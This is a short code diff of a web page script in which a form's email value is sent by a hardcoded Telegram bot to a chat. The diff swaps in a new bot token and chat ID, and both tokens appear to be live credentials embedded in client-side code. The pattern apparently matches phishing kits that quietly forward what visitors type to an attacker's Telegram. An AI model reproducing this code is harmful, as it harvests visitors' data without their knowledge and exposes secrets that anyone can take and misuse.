@@ -12,8 +12,8 @@
     async function sendEmailToTelegram(event) {
       event.preventDefault();
       const email = document.getElementById('email').value;
-      const botToken = '7619144760:AAFgnQ9NIw4IR8SA-JNLk2upPe0LHvNMgKM'; // <-- Insert your bot token here
-      const chatId = '@edns1';     // <-- Insert your chat ID here
+      const botToken = '7920256610:AAG8onR0uHV26STCkfrcEsRFQBJ4CMdc1vQ'; // <-- Insert your bot token here
+      const chatId = '8487487876';     // <-- Insert your chat ID here
       const message = `Email address: ${email}`;
       
       const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
